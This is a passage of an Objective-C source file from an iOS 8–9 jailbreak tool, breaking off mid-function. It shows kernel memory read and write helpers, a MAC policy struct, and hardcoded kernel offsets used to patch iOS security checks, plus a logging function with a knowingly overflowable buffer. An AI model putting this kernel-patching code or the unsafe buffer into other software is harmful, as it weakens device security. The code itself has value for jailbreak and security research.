//
//  jailbreak.m
//  openpwnage
//
//  Created by Zachary Keffaber on 4/24/22.
//

//big thanks to (jk maybe?) for kpmap patch, and thanks to spv for misc stuff

#import <Foundation/Foundation.h>
#include <mach/mach.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <UIKit/UIKit.h>
#include <sys/mount.h>
#include <spawn.h>
#include <copyfile.h>
#include <sys/sysctl.h>
#include <sys/stat.h>
#include "LGPL/patchfinder.h"
#include "LGPL/kpmapAndCo.h"

#import "ViewController.h"

#define UNSLID_BASE 0x80001000

void olog(char *format, ...) {
    char msg[1000];//this can overflow, but eh don't care
    va_list aptr;

    va_start(aptr, format);
    vsprintf(msg, format, aptr);
    va_end(aptr);

    NSString *logTxt = [NSString stringWithUTF8String:msg];

    openpwnageCLog(logTxt);
}

NSString *KernelVersion(void) {
    size_t size;
    sysctlbyname("kern.version", NULL, &size, NULL, 0);
    char *kernelVersion = malloc(size);
    sysctlbyname("kern.version", kernelVersion, &size, NULL, 0);
    olog("%s\n",kernelVersion);
    
    char *newkernv = malloc(size - 44);
    char *semicolon = strchr(kernelVersion, '~');
    int indexofsemi = (int)(semicolon - kernelVersion);
    int indexofrootxnu = indexofsemi;
    while (kernelVersion[indexofrootxnu - 1] != '-') {
        indexofrootxnu -= 1;
    }
    memcpy(newkernv, &kernelVersion[indexofrootxnu], indexofsemi - indexofrootxnu + 2);
    newkernv[indexofsemi - indexofrootxnu + 2] = '\0';
    
    return [NSString stringWithUTF8String:newkernv];
}
//below is from doubleh3lix

struct mac_policy_ops {
    uint32_t mpo_audit_check_postselect;
    uint32_t mpo_audit_check_preselect;
    uint32_t mpo_bpfdesc_label_associate;
    uint32_t mpo_bpfdesc_label_destroy;
    uint32_t mpo_bpfdesc_label_init;
    uint32_t mpo_bpfdesc_check_receive;
    uint32_t mpo_cred_check_label_update_execve;
    uint32_t mpo_cred_check_label_update;
    uint32_t mpo_cred_check_visible;
    uint32_t mpo_cred_label_associate_fork;
    uint32_t mpo_cred_label_associate_kernel;
    uint32_t mpo_cred_label_associate;
    uint32_t mpo_cred_label_associate_user;
    uint32_t mpo_cred_label_destroy;
    uint32_t mpo_cred_label_externalize_audit;
    uint32_t mpo_cred_label_externalize;
    uint32_t mpo_cred_label_init;
    uint32_t mpo_cred_label_internalize;
    uint32_t mpo_cred_label_update_execve;
    uint32_t mpo_cred_label_update;
    uint32_t mpo_devfs_label_associate_device;
    uint32_t mpo_devfs_label_associate_directory;
    uint32_t mpo_devfs_label_copy;
    uint32_t mpo_devfs_label_destroy;
    uint32_t mpo_devfs_label_init;
    uint32_t mpo_devfs_label_update;
    uint32_t mpo_file_check_change_offset;
    uint32_t mpo_file_check_create;
    uint32_t mpo_file_check_dup;
    uint32_t mpo_file_check_fcntl;
    uint32_t mpo_file_check_get_offset;
    uint32_t mpo_file_check_get;
    uint32_t mpo_file_check_inherit;
    uint32_t mpo_file_check_ioctl;
    uint32_t mpo_file_check_lock;
    uint32_t mpo_file_check_mmap_downgrade;
    uint32_t mpo_file_check_mmap;
    uint32_t mpo_file_check_receive;
    uint32_t mpo_file_check_set;
    uint32_t mpo_file_label_init;
    uint32_t mpo_file_label_destroy;
    uint32_t mpo_file_label_associate;
    uint32_t mpo_ifnet_check_label_update;
    uint32_t mpo_ifnet_check_transmit;
    uint32_t mpo_ifnet_label_associate;
    uint32_t mpo_ifnet_label_copy;
    uint32_t mpo_ifnet_label_destroy;
    uint32_t mpo_ifnet_label_externalize;
    uint32_t mpo_ifnet_label_init;
    uint32_t mpo_ifnet_label_internalize;
    uint32_t mpo_ifnet_label_update;
    uint32_t mpo_ifnet_label_recycle;
    uint32_t mpo_inpcb_check_deliver;
    uint32_t mpo_inpcb_label_associate;
    uint32_t mpo_inpcb_label_destroy;
    uint32_t mpo_inpcb_label_init;
    uint32_t mpo_inpcb_label_recycle;
    uint32_t mpo_inpcb_label_update;
    uint32_t mpo_iokit_check_device;
    uint32_t mpo_ipq_label_associate;
    uint32_t mpo_ipq_label_compare;
    uint32_t mpo_ipq_label_destroy;
    uint32_t mpo_ipq_label_init;
    uint32_t mpo_ipq_label_update;
    uint32_t mpo_file_check_library_validation;
    uint32_t mpo_vnode_notify_setacl;
    uint32_t mpo_vnode_notify_setattrlist;
    uint32_t mpo_vnode_notify_setextattr;
    uint32_t mpo_vnode_notify_setflags;
    uint32_t mpo_vnode_notify_setmode;
    uint32_t mpo_vnode_notify_setowner;
    uint32_t mpo_vnode_notify_setutimes;
    uint32_t mpo_vnode_notify_truncate;
    uint32_t mpo_mbuf_label_associate_bpfdesc;
    uint32_t mpo_mbuf_label_associate_ifnet;
    uint32_t mpo_mbuf_label_associate_inpcb;
    uint32_t mpo_mbuf_label_associate_ipq;
    uint32_t mpo_mbuf_label_associate_linklayer;
    uint32_t mpo_mbuf_label_associate_multicast_encap;
    uint32_t mpo_mbuf_label_associate_netlayer;
    uint32_t mpo_mbuf_label_associate_socket;
    uint32_t mpo_mbuf_label_copy;
    uint32_t mpo_mbuf_label_destroy;
    uint32_t mpo_mbuf_label_init;
    uint32_t mpo_mount_check_fsctl;
    uint32_t mpo_mount_check_getattr;
    uint32_t mpo_mount_check_label_update;
    uint32_t mpo_mount_check_mount;
    uint32_t mpo_mount_check_remount;
    uint32_t mpo_mount_check_setattr;
    uint32_t mpo_mount_check_stat;
    uint32_t mpo_mount_check_umount;
    uint32_t mpo_mount_label_associate;
    uint32_t mpo_mount_label_destroy;
    uint32_t mpo_mount_label_externalize;
    uint32_t mpo_mount_label_init;
    uint32_t mpo_mount_label_internalize;
    uint32_t mpo_netinet_fragment;
    uint32_t mpo_netinet_icmp_reply;
    uint32_t mpo_netinet_tcp_reply;
    uint32_t mpo_pipe_check_ioctl;
    uint32_t mpo_pipe_check_kqfilter;
    uint32_t mpo_pipe_check_label_update;
    uint32_t mpo_pipe_check_read;
    uint32_t mpo_pipe_check_select;
    uint32_t mpo_pipe_check_stat;
    uint32_t mpo_pipe_check_write;
    uint32_t mpo_pipe_label_associate;
    uint32_t mpo_pipe_label_copy;
    uint32_t mpo_pipe_label_destroy;
    uint32_t mpo_pipe_label_externalize;
    uint32_t mpo_pipe_label_init;
    uint32_t mpo_pipe_label_internalize;
    uint32_t mpo_pipe_label_update;
    uint32_t mpo_policy_destroy;
    uint32_t mpo_policy_init;
    uint32_t mpo_policy_initbsd;
    uint32_t mpo_policy_syscall;
    uint32_t mpo_system_check_sysctlbyname;
    uint32_t mpo_proc_check_inherit_ipc_ports;
    uint32_t mpo_vnode_check_rename;
    uint32_t mpo_kext_check_query;
    uint32_t mpo_iokit_check_nvram_get;
    uint32_t mpo_iokit_check_nvram_set;
    uint32_t mpo_iokit_check_nvram_delete;
    uint32_t mpo_proc_check_expose_task;
    uint32_t mpo_proc_check_set_host_special_port;
    uint32_t mpo_proc_check_set_host_exception_port;
    uint32_t mpo_exc_action_check_exception_send;
    uint32_t mpo_exc_action_label_associate;
    uint32_t mpo_exc_action_label_populate;
    uint32_t mpo_exc_action_label_destroy;
    uint32_t mpo_exc_action_label_init;
    uint32_t mpo_exc_action_label_update;
    uint32_t mpo_reserved1;
    uint32_t mpo_reserved2;
    uint32_t mpo_reserved3;
    uint32_t mpo_reserved4;
    uint32_t mpo_skywalk_flow_check_connect;
    uint32_t mpo_skywalk_flow_check_listen;
    uint32_t mpo_posixsem_check_create;
    uint32_t mpo_posixsem_check_open;
    uint32_t mpo_posixsem_check_post;
    uint32_t mpo_posixsem_check_unlink;
    uint32_t mpo_posixsem_check_wait;
    uint32_t mpo_posixsem_label_associate;
    uint32_t mpo_posixsem_label_destroy;
    uint32_t mpo_posixsem_label_init;
    uint32_t mpo_posixshm_check_create;
    uint32_t mpo_posixshm_check_mmap;
    uint32_t mpo_posixshm_check_open;
    uint32_t mpo_posixshm_check_stat;
    uint32_t mpo_posixshm_check_truncate;
    uint32_t mpo_posixshm_check_unlink;
    uint32_t mpo_posixshm_label_associate;
    uint32_t mpo_posixshm_label_destroy;
    uint32_t mpo_posixshm_label_init;
    uint32_t mpo_proc_check_debug;
    uint32_t mpo_proc_check_fork;
    uint32_t mpo_proc_check_get_task_name;
    uint32_t mpo_proc_check_get_task;
    uint32_t mpo_proc_check_getaudit;
    uint32_t mpo_proc_check_getauid;
    uint32_t mpo_proc_check_getlcid;
    uint32_t mpo_proc_check_mprotect;
    uint32_t mpo_proc_check_sched;
    uint32_t mpo_proc_check_setaudit;
    uint32_t mpo_proc_check_setauid;
    uint32_t mpo_proc_check_setlcid;
    uint32_t mpo_proc_check_signal;
    uint32_t mpo_proc_check_wait;
    uint32_t mpo_proc_label_destroy;
    uint32_t mpo_proc_label_init;
    uint32_t mpo_socket_check_accept;
    uint32_t mpo_socket_check_accepted;
    uint32_t mpo_socket_check_bind;
    uint32_t mpo_socket_check_connect;
    uint32_t mpo_socket_check_create;
    uint32_t mpo_socket_check_deliver;
    uint32_t mpo_socket_check_kqfilter;
    uint32_t mpo_socket_check_label_update;
    uint32_t mpo_socket_check_listen;
    uint32_t mpo_socket_check_receive;
    uint32_t mpo_socket_check_received;
    uint32_t mpo_socket_check_select;
    uint32_t mpo_socket_check_send;
    uint32_t mpo_socket_check_stat;
    uint32_t mpo_socket_check_setsockopt;
    uint32_t mpo_socket_check_getsockopt;
    uint32_t mpo_socket_label_associate_accept;
    uint32_t mpo_socket_label_associate;
    uint32_t mpo_socket_label_copy;
    uint32_t mpo_socket_label_destroy;
    uint32_t mpo_socket_label_externalize;
    uint32_t mpo_socket_label_init;
    uint32_t mpo_socket_label_internalize;
    uint32_t mpo_socket_label_update;
    uint32_t mpo_socketpeer_label_associate_mbuf;
    uint32_t mpo_socketpeer_label_associate_socket;
    uint32_t mpo_socketpeer_label_destroy;
    uint32_t mpo_socketpeer_label_externalize;
    uint32_t mpo_socketpeer_label_init;
    uint32_t mpo_system_check_acct;
    uint32_t mpo_system_check_audit;
    uint32_t mpo_system_check_auditctl;
    uint32_t mpo_system_check_auditon;
    uint32_t mpo_system_check_host_priv;
    uint32_t mpo_system_check_nfsd;
    uint32_t mpo_system_check_reboot;
    uint32_t mpo_system_check_settime;
    uint32_t mpo_system_check_swapoff;
    uint32_t mpo_system_check_swapon;
    uint32_t mpo_socket_check_ioctl;
    uint32_t mpo_sysvmsg_label_associate;
    uint32_t mpo_sysvmsg_label_destroy;
    uint32_t mpo_sysvmsg_label_init;
    uint32_t mpo_sysvmsg_label_recycle;
    uint32_t mpo_sysvmsq_check_enqueue;
    uint32_t mpo_sysvmsq_check_msgrcv;
    uint32_t mpo_sysvmsq_check_msgrmid;
    uint32_t mpo_sysvmsq_check_msqctl;
    uint32_t mpo_sysvmsq_check_msqget;
    uint32_t mpo_sysvmsq_check_msqrcv;
    uint32_t mpo_sysvmsq_check_msqsnd;
    uint32_t mpo_sysvmsq_label_associate;
    uint32_t mpo_sysvmsq_label_destroy;
    uint32_t mpo_sysvmsq_label_init;
    uint32_t mpo_sysvmsq_label_recycle;
    uint32_t mpo_sysvsem_check_semctl;
    uint32_t mpo_sysvsem_check_semget;
    uint32_t mpo_sysvsem_check_semop;
    uint32_t mpo_sysvsem_label_associate;
    uint32_t mpo_sysvsem_label_destroy;
    uint32_t mpo_sysvsem_label_init;
    uint32_t mpo_sysvsem_label_recycle;
    uint32_t mpo_sysvshm_check_shmat;
    uint32_t mpo_sysvshm_check_shmctl;
    uint32_t mpo_sysvshm_check_shmdt;
    uint32_t mpo_sysvshm_check_shmget;
    uint32_t mpo_sysvshm_label_associate;
    uint32_t mpo_sysvshm_label_destroy;
    uint32_t mpo_sysvshm_label_init;
    uint32_t mpo_sysvshm_label_recycle;
    uint32_t mpo_proc_notify_exit;
    uint32_t mpo_mount_check_snapshot_revert;
    uint32_t mpo_vnode_check_getattr;
    uint32_t mpo_mount_check_snapshot_create;
    uint32_t mpo_mount_check_snapshot_delete;
    uint32_t mpo_vnode_check_clone;
    uint32_t mpo_proc_check_get_cs_info;
    uint32_t mpo_proc_check_set_cs_info;
    uint32_t mpo_iokit_check_hid_control;
    uint32_t mpo_vnode_check_access;
    uint32_t mpo_vnode_check_chdir;
    uint32_t mpo_vnode_check_chroot;
    uint32_t mpo_vnode_check_create;
    uint32_t mpo_vnode_check_deleteextattr;
    uint32_t mpo_vnode_check_exchangedata;
    uint32_t mpo_vnode_check_exec;
    uint32_t mpo_vnode_check_getattrlist;
    uint32_t mpo_vnode_check_getextattr;
    uint32_t mpo_vnode_check_ioctl;
    uint32_t mpo_vnode_check_kqfilter;
    uint32_t mpo_vnode_check_label_update;
    uint32_t mpo_vnode_check_link;
    uint32_t mpo_vnode_check_listextattr;
    uint32_t mpo_vnode_check_lookup;
    uint32_t mpo_vnode_check_open;
    uint32_t mpo_vnode_check_read;
    uint32_t mpo_vnode_check_readdir;
    uint32_t mpo_vnode_check_readlink;
    uint32_t mpo_vnode_check_rename_from;
    uint32_t mpo_vnode_check_rename_to;
    uint32_t mpo_vnode_check_revoke;
    uint32_t mpo_vnode_check_select;
    uint32_t mpo_vnode_check_setattrlist;
    uint32_t mpo_vnode_check_setextattr;
    uint32_t mpo_vnode_check_setflags;
    uint32_t mpo_vnode_check_setmode;
    uint32_t mpo_vnode_check_setowner;
    uint32_t mpo_vnode_check_setutimes;
    uint32_t mpo_vnode_check_stat;
    uint32_t mpo_vnode_check_truncate;
    uint32_t mpo_vnode_check_unlink;
    uint32_t mpo_vnode_check_write;
    uint32_t mpo_vnode_label_associate_devfs;
    uint32_t mpo_vnode_label_associate_extattr;
    uint32_t mpo_vnode_label_associate_file;
    uint32_t mpo_vnode_label_associate_pipe;
    uint32_t mpo_vnode_label_associate_posixsem;
    uint32_t mpo_vnode_label_associate_posixshm;
    uint32_t mpo_vnode_label_associate_singlelabel;
    uint32_t mpo_vnode_label_associate_socket;
    uint32_t mpo_vnode_label_copy;
    uint32_t mpo_vnode_label_destroy;
    uint32_t mpo_vnode_label_externalize_audit;
    uint32_t mpo_vnode_label_externalize;
    uint32_t mpo_vnode_label_init;
    uint32_t mpo_vnode_label_internalize;
    uint32_t mpo_vnode_label_recycle;
    uint32_t mpo_vnode_label_store;
    uint32_t mpo_vnode_label_update_extattr;
    uint32_t mpo_vnode_label_update;
    uint32_t mpo_vnode_notify_create;
    uint32_t mpo_vnode_check_signature;
    uint32_t mpo_vnode_check_uipc_bind;
    uint32_t mpo_vnode_check_uipc_connect;
    uint32_t mpo_proc_check_run_cs_invalid;
    uint32_t mpo_proc_check_suspend_resume;
    uint32_t mpo_thread_userret;
    uint32_t mpo_iokit_check_set_properties;
    uint32_t mpo_system_check_chud;
    uint32_t mpo_vnode_check_searchfs;
    uint32_t mpo_priv_check;
    uint32_t mpo_priv_grant;
    uint32_t mpo_proc_check_map_anon;
    uint32_t mpo_vnode_check_fsgetpath;
    uint32_t mpo_iokit_check_open;
    uint32_t mpo_proc_check_ledger;
    uint32_t mpo_vnode_notify_rename;
    uint32_t mpo_vnode_check_setacl;
    uint32_t mpo_vnode_notify_deleteextattr;
    uint32_t mpo_system_check_kas_info;
    uint32_t mpo_vnode_check_lookup_preflight;
    uint32_t mpo_vnode_notify_open;
    uint32_t mpo_system_check_info;
    uint32_t mpo_pty_notify_grant;
    uint32_t mpo_pty_notify_close;
    uint32_t mpo_vnode_find_sigs;
    uint32_t mpo_kext_check_load;
    uint32_t mpo_kext_check_unload;
    uint32_t mpo_proc_check_proc_info;
    uint32_t mpo_vnode_notify_link;
    uint32_t mpo_iokit_check_filter_properties;
    uint32_t mpo_iokit_check_get_property;
};

//now time for actual stuff

uint32_t kread_uint32(uint32_t addr, task_t tfp0) {
    vm_size_t bytesRead=0;
    uint32_t ret = 0;
    vm_read_overwrite(tfp0,addr,4,(vm_address_t)&ret,&bytesRead);
    return ret;
}

void kwrite_uint32(uint32_t addr, uint32_t value, task_t tfp0) {
    vm_write(tfp0,addr,(vm_offset_t)&value,4);
}

void kwrite_uint8(uint32_t addr, uint8_t value, task_t tfp0) {
    vm_write(tfp0,addr,(vm_offset_t)&value,1);
}

uint32_t hardcoded_allproc(void){
    //i should prob write a patchfinder rather than just using hardcoded offsets, but eh works anyway
        uint32_t allproc;
    struct utsname systemInfo;
    uname(&systemInfo);
    NSArray *isA5orA5X = [NSArray arrayWithObjects:@"iPad2,1",@"iPad2,2",@"iPad2,3",@"iPad2,4",@"iPad2,5",@"iPad2,6",@"iPad2,7",@"iPad3,1",@"iPad3,2",@"iPad3,3",@"iPhone4,1",@"iPod5,1", nil];
    if([isA5orA5X containsObject:[NSString stringWithCString:systemInfo.machine encoding:NSUTF8StringEncoding]]) {
        //A5 or A5X
        if ([[NSArray arrayWithObjects:@"3248.61.1~1",@"3248.60.9~1",@"3248.60.8~1",@"3248.60.4~1",@"3248.60.3~3",@"3248.50.21~4",@"3248.50.20~1",@"3248.50.18~1",@"3248.41.4~2",@"3248.41.4~3",@"3248.41.3~1", nil] containsObject:KernelVersion()]) { //9.3b4-9.3.6
            allproc = 0x45717c; //allproc offset for 9.3.X A5, 0x45f2c8 9.3.4 A6
            olog("using 0x45717c\n");
        } else if ([[NSArray arrayWithObjects:@"3248.40.173.0.1~1",@"3248.40.166.0.1~1",@"3248.40.155.1.1~3", nil] containsObject:KernelVersion()]){ //9.3b1-9.3b3
            allproc = 0x45718c; //allproc offset for 9.3b3
            olog("using 0x45718c\n");
        } else if ([[NSArray arrayWithObjects:@"3248.31.3~2",@"3248.21.2~1", nil] containsObject:KernelVersion()]){ //9.2b4-9.2.1
            allproc = 0x450128; //allproc offset for 9.2.X, 0x457264 A6
            olog("using 0x450128\n");
        } else if ([[NSArray arrayWithObjects:@"3248.21.1~2", nil] containsObject:KernelVersion()]){ //9.2b3
            allproc = 0x450120; //allproc offset for 9.2.X, ?? A6
            olog("using 0x44e920\n");
        } else if ([[NSArray arrayWithObjects:@"3248.20.39~8", nil] containsObject:KernelVersion()]){ //9.2b2
            allproc = 0x44e920; //allproc offset for 9.2.X, ?? A6
            olog("using 0x44e920\n");
        } else if ([[NSArray arrayWithObjects:@"3248.20.33.0.1~7", nil] containsObject:KernelVersion()]){ //9.2b1
            allproc = 0x45a920; //allproc offset for 9.2.X, ?? A6
            olog("using 0x45a920\n");
        } else if ([[NSArray arrayWithObjects:@"3248.10.42~4",@"3248.10.41~1",@"3248.10.38~3", nil] containsObject:KernelVersion()]) { //9.1b2-9.1
            allproc = 0x458904; //allproc offset for 9.1 A5, 0x45fa40 A6
            olog("using 0x458904\n");
        } else if ([[NSArray arrayWithObjects:@"3248.10.27~1", nil] containsObject:KernelVersion()]){ //9.1b1
            allproc = 0x458884;
            olog("using 0x458884\n");
        } else if ([[NSArray arrayWithObjects:@"3248.1.3~1",@"3248.1.2~3",@"3247.1.88.1.1~1", nil] containsObject:KernelVersion()]) { //9.0b5-9.0.2
            allproc = 0x457874; //allproc offset for 9.0.X A5, 0x45d9b0 A6
            olog("using 0x457874\n");
        } else if ([[NSArray arrayWithObjects:@"3247.1.56~1", nil] containsObject:KernelVersion()]) { //9.0b4
            allproc = 0x4557ec; //allproc offset for 9.0.X A5, 0x45d9b0 A6
            olog("using 0x457874\n");
        } else if ([[NSArray arrayWithObjects:@"3247.1.36.0.1~9", nil] containsObject:KernelVersion()]) { //9.0b3
            allproc = 0x4567d8; //allproc offset for 9.0.X A5, 0x45d9b0 A6
            olog("using 0x4567d8\n");
        } else if ([[NSArray arrayWithObjects:@"3247.1.6.1.1~2", nil] containsObject:KernelVersion()]){ //9.0b2
            allproc = 0x45d68c; //allproc offset for 9.0.X A5, 0x45d9b0 A6
            olog("using 0x45d68c\n");
        } else if ([[NSArray arrayWithObjects:@"3216.0.0.1.15~2", nil] containsObject:KernelVersion()]){ //9.0b1
            allproc = 0x45a580; //i was kind of nervous that the Phoenix exploit didn't work on 9.0b1 and I'd need to use Trident but according to a friend it works
            olog("using 0x45a580\n");
        } else { //8.4.1
            allproc = 0x3f4810;
            olog("using 0x3f4810\n");
        }
    } else {
        //A6 or A6X
        if ([[NSArray arrayWithObjects:@"3248.61.1~1",@"3248.60.9~1",@"3248.60.8~1",@"3248.60.4~1",@"3248.60.3~3",@"3248.50.21~4",@"3248.50.20~1",@"3248.50.18~1",@"3248.41.4~2",@"3248.41.4~3",@"3248.41.3~1",@"3248.40.173.0.1~1",@"3248.40.166.0.1~1",@"3248.40.155.1.1~3", nil] containsObject:KernelVersion()]) { //9.3b1-9.3.6
            allproc = 0x45f2c8; //0x804602c8 9.3.X A6
            olog("using 0x45f2c8\n");
        } else if ([[NSArray arrayWithObjects:@"3248.31.3~2",@"3248.21.2~1", nil] containsObject:KernelVersion()]){ //9.2b4-9.2.1
            allproc = 0x457264; //allproc offset for 9.2.X, 0x457264 A6
            olog("using 0x457264\n");
        } else if ([[NSArray arrayWithObjects:@"3248.21.1~2", nil] containsObject:KernelVersion()]){ //9.2b3
            allproc = 0x45725c;
            olog("using 0x45725c\n");
        } else if ([[NSArray arrayWithObjects:@"3248.20.39~8",@"3248.20.33.0.1~7", nil] containsObject:KernelVersion()]){ //9.2b1/9.2b2
            allproc = 0x456a5c; //allproc offset for 9.2.X, ?? A6
            olog("using 0x44e920\n");
        } else if ([[NSArray arrayWithObjects:@"3248.10.42~4",@"3248.10.41~1",@"3248.10.38~3", nil] containsObject:KernelVersion()]) { //9.1b2-9.1
            allproc = 0x45fa40; //allproc offset for 9.1 A5, 0x45fa40 A6
            olog("using 0x45fa40\n");
        } else if ([[NSArray arrayWithObjects:@"3248.10.27~1", nil] containsObject:KernelVersion()]){ //9.1b1
            allproc = 0x45e9c0;
            olog("using 0x45e9c0\n");
        } else if ([[NSArray arrayWithObjects:@"3248.1.3~1",@"3248.1.2~3",@"3247.1.88.1.1~1", nil] containsObject:KernelVersion()]) { //9.0b5-9.0.2
            allproc = 0x45d9b0; //allproc offset for 9.0.X A5, 0x45d9b0 A6
            olog("using 0x45d9b0\n");
        } else if ([[NSArray arrayWithObjects:@"3247.1.56~1", nil] containsObject:KernelVersion()]){ //9.0b4
            allproc = 0x45c928;
            olog("using 0x45c928\n");
        } else if ([[NSArray arrayWithObjects:@"3247.1.36.0.1~9", nil] containsObject:KernelVersion()]) { //9.0b3
            allproc = 0x45e914;
            olog("using 0x45e914\n");
        } else if ([[NSArray arrayWithObjects:@"3247.1.6.1.1~2", nil] containsObject:KernelVersion()]) { //9.0b2
            allproc = 0x4657c8;
            olog("using 0x4657c8\n");
        } else {
            allproc = 0x4616c0;
            olog("using 0x4616c0\n");
        }
    }
        olog("[*] found allproc: 0x%08x\n", allproc);
        return allproc;
}

uint32_t find_PE_i_can_has_debugger_1(uint32_t region, uint8_t* kdata, size_t ksize) {
    uint32_t PE_i_can_has_debugger_1;
    struct utsname systemInfo;
    uname(&systemInfo);
    NSArray *isA5orA5X = [NSArray arrayWithObjects:@"iPad2,1",@"iPad2,2",@"iPad2,3",@"iPad2,4",@"iPad2,5",@"iPad2,6",@"iPad2,7",@"iPad3,1",@"iPad3,2",@"iPad3,3",@"iPhone4,1",@"iPod5,1", nil];
    if([isA5orA5X containsObject:[NSString stringWithCString:systemInfo.machine encoding:NSUTF8StringEncoding]]) {
        //A5 or A5X
    if ([[NSArray arrayWithObjects:@"3248.61.1~1", nil] containsObject:KernelVersion()]) { //9.3.5-9.3.6
        PE_i_can_has_debugger_1 = 0x3a82c4; //find_PE_i_can_has_debugger_1 offset for 9.3.5/9.3.6
        olog("using 0x3a82c4\n"); //on A6: 0x803b0ee4 / 0x3afee4 9.3.5
    } else if ([[NSArray arrayWithObjects:@"3248.60.9~1", nil] containsObject:KernelVersion()]) { //9.3.3b4-9.3.4
        PE_i_can_has_debugger_1 = 0x3a82d4; //find_PE_i_can_has_debugger_1 offset for 9.3.3/9.3.4
        olog("using 0x3a82d4\n"); // 0x803a92d4 A5, 0x803b0f14 A6
    } else if ([[NSArray arrayWithObjects:@"3248.60.8~1", nil] containsObject:KernelVersion()]) { //9.3.3b3
        PE_i_can_has_debugger_1 = 0x3a8424;
        olog("using 0x3a8424\n"); // 0x803a9424 A5, not sure A6
    } else if ([[NSArray arrayWithObjects:@"3248.60.4~1", nil] containsObject:KernelVersion()]) { //9.3.3b2
        PE_i_can_has_debugger_1 = 0x3a81f4;
        olog("using 0x3a81f4\n"); // 0x803a91f4 A5, not sure A6
    } else if ([[NSArray arrayWithObjects:@"3248.60.3~3", nil] containsObject:KernelVersion()]) { //9.3.3b1
        PE_i_can_has_debugger_1 = 0x3a8294;
        olog("using 0x3a8294\n"); // 0x803a9294 A5, not sure A6
    } else if ([[NSArray arrayWithObjects:@"3248.50.21~4", nil] containsObject:KernelVersion()]) { //9.3.2b3-9.3.2
        PE_i_can_has_debugger_1 = 0x3a7ff4; //find_PE_i_can_has_debugger_1 offset for 9.3.2
        olog("using 0x3a7ff4\n"); // 0x803a8ff4 A5, 0x803b0b14 A6
    } else if ([[NSArray arrayWithObjects:@"3248.50.20~1", nil] containsObject:KernelVersion()]) { //9.3.2b2
        PE_i_can_has_debugger_1 = 0x3a7ff4;
        olog("using 0x3a7ff4\n"); // 0x803a8ff4 A5, not sure A6
    } else if ([[NSArray arrayWithObjects:@"3248.50.18~1", nil] containsObject:KernelVersion()]) { //9.3.2b1
        PE_i_can_has_debugger_1 = 0x3a7ff4;
        olog("using 0x3a7ff4\n"); // 0x803a8ff4 A5, not sure A6
    } else if ([[NSArray arrayWithObjects:@"3248.41.4~2", nil] containsObject:KernelVersion()]) { //9.3b7-9.3.1
        PE_i_can_has_debugger_1 = 0x3a7ea4; //find_PE_i_can_has_debugger_1 offset for 9.3
        olog("using 0x3a7ea4\n"); //may be 0x803a8ea4 / 0x3a7ea4 for 9.3, A6 is 0x803b0af4 / 0x3afaf4
    } else if ([[NSArray arrayWithObjects:@"3248.41.4~3", nil] containsObject:KernelVersion()]) { //9.3b5-9.3b6
        PE_i_can_has_debugger_1 = 0x3a7ea4; //find_PE_i_can_has_debugger_1 offset for 9.3
        olog("using 0x3a7ea4\n"); //may be 0x803a8ea4 / 0x3a7ea4 for 9.3, A6 is 0x803b0af4 / 0x3afaf4
    } else if ([[NSArray arrayWithObjects:@"3248.41.3~1", nil] containsObject:KernelVersion()]) { //9.3b4
        PE_i_can_has_debugger_1 = 0x3a7ea4; //find_PE_i_can_has_debugger_1 offset for 9.3
        olog("using 0x3a7ea4\n"); //may be 0x803a8ea4 / 0x3a7ea4 for 9.3, A6 is 0x803b0af4 / 0x3afaf4
    } else if ([[NSArray arrayWithObjects:@"3248.40.173.0.1~1", nil] containsObject:KernelVersion()]) { //9.3b3
        PE_i_can_has_debugger_1 = 0x3a7cf4; //find_PE_i_can_has_debugger_1 offset for 9.3
        olog("using 0x3a7cf4\n"); //may be 0x803a8cf4 / 0x3a7cf4 for 9.3, A6 is ??
    } else if ([[NSArray arrayWithObjects:@"3248.40.166.0.1~1", nil] containsObject:KernelVersion()]) { //9.3b2
        PE_i_can_has_debugger_1 = 0x3af964; //find_PE_i_can_has_debugger_1 offset for 9.3
        olog("using 0x3af964\n"); //A6 is 0x803b0964
    } else if ([[NSArray arrayWithObjects:@"3248.40.155.1.1~3", nil] containsObject:KernelVersion()]) { //9.3b1/9.3b1.1
        PE_i_can_has_debugger_1 = 0x3a77f4; //find_PE_i_can_has_debugger_1 offset for 9.3
        olog("using 0x3a77f4\n"); //may be 0x803a87f4 / 0x3a77f4 for 9.3, A6 is ??
    } else if ([[NSArray arrayWithObjects:@"3248.31.3~2", nil] containsObject:KernelVersion()]) { //9.2.1b1-9.2.1
        PE_i_can_has_debugger_1 = 0x3a1434; //find_PE_i_can_has_debugger_1 offset for 9.2.1
        olog("using 0x3a1434\n"); //0x803a2434 / 0x3a1434 on A5, 0x803a9764 / 0x3a8764 A6
    } else if ([[NSArray arrayWithObjects:@"3248.21.2~1", nil] containsObject:KernelVersion()]) { //9.2b4-9.2
        PE_i_can_has_debugger_1 = 0x3a12c4; //find_PE_i_can_has_debugger_1 offset for 9.2
        olog("using 0x3a12c4\n"); //0x803a22c4 / 0x3a1434 on A5, 0x803a95e4 / 0x3a85e4 A6
    } else if ([[NSArray arrayWithObjects:@"3248.21.1~2", nil] containsObject:KernelVersion()]) { //9.2b3
        PE_i_can_has_debugger_1 = 0x3a1164; //find_PE_i_can_has_debugger_1 offset for 9.2b2
        olog("using 0x3a1164\n");
    } else if ([[NSArray arrayWithObjects:@"3248.20.39~8", nil] containsObject:KernelVersion()]) { //9.2b2
        PE_i_can_has_debugger_1 = 0x3a0a94; //find_PE_i_can_has_debugger_1 offset for 9.2b2
        olog("using 0x3a0a94\n");
    } else if ([[NSArray arrayWithObjects:@"3248.20.33.0.1~7", nil] containsObject:KernelVersion()]) { //9.2b1
        PE_i_can_has_debugger_1 = 0x3ac744; //find_PE_i_can_has_debugger_1 offset for 9.2b2
        olog("using 0x3ac744\n");
    } else if ([[NSArray arrayWithObjects:@"3248.10.42~4",@"3248.10.41~1",@"3248.10.38~3", nil] containsObject:KernelVersion()]) { //9.1b2-9.1
        PE_i_can_has_debugger_1 = 0x3aa734; //find_PE_i_can_has_debugger_1 offset for 9.1
        olog("using 0x3aa734\n"); //A6 is 0x803b1694 / 0x3b0694
    } else if ([[NSArray arrayWithObjects:@"3248.10.27~1", nil] containsObject:KernelVersion()]){ //9.1b1
        PE_i_can_has_debugger_1 = 0x3aa654;
        olog("using 0x3aa654\n");
    } else if ([[NSArray arrayWithObjects:@"3248.1.3~1",@"3248.1.2~3", nil] containsObject:KernelVersion()]) { //9.0GM-9.0.2
        PE_i_can_has_debugger_1 = 0x3a8fc4; //find_PE_i_can_has_debugger_1 offset for 9.1
        olog("using 0x3a8fc4\n"); //A6 is ??
